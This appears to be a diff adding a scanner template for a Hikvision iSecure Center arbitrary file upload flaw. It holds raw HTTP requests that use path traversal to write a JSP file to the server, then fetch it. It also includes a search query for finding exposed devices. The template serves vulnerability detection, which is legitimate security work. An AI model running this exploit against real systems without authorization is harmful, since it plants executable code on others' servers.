@@ -1,0 +1,48 @@
+id: hikvision-js-files-upload
+
+info:
+  name: Hikvision iSecure Center - File Upload
+  author: Xc1Ym
+  severity: critical
+  description: |
+    THikvision iSecure Center /center/api/files;.js has an arbitrary file upload vulnerability
+  reference:
+    - https://zhuanlan.zhihu.com/p/639514473
+    - https://mp.weixin.qq.com/s/DR9xbwnrpg6YYSTw5pIAhw
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/hikvision-files-upload.yaml
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: icon_hash="-808437027",app="HIKVISION-综合安防管理平台",title="综合安防管理平台"
+  tags: fileupload,iot,hikvision,intrusive
+variables:
+  filename: '{{rand_base(6)}}'
+  payload: '{{rand_base(6)}}'
+  print: '<%out.print("{{payload}}");%>'
+
+http:
+  - raw:
+      - |
+        POST /center/api/files;.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}.jsp"
+        Content-Type:image/jpeg
+
+        {{print}}
+        ------WebKitFormBoundarygcflwtei--
+      - |
+        GET /clusterMgr/{{filename}}.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{payload}}")'
+        condition: and
+
+# digest: 4a0a00473045022100b950d772245477a3b9ca9e272b20a63f38c6dc64378b6fa9dace29426cca5450022007f3af02a3422204244432721fbbdd6997a13cea83e2aac2259e960c7aefeb14:922c64590222798bb761d5b6d8e72950
